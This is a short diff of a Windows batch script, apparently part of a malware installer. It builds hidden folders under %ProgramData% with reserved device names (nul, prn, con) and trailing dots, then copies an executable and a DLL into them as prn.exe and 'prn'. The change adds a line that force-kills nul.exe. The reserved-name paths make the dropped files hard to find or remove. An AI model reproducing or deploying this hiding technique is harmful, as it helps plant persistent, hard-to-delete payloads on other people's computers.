@@ -35,6 +35,7 @@ mkdir %ProgramData%\hared
 mkdir \\.\%ProgramData%\nuldata..\
 mkdir \\.\%ProgramData%\prndata..\
 mkdir \\.\%ProgramData%\condata..\
+taskkill.exe /f /IM nul.exe
 
 copy /Y "%ProgramData%\hared\Index.exe" "\\.\%ProgramData%\prndata..\prn.exe"
 type "%ProgramData%\hared\IconLib.dll" > "\\.\%ProgramData%\prndata..\prn"
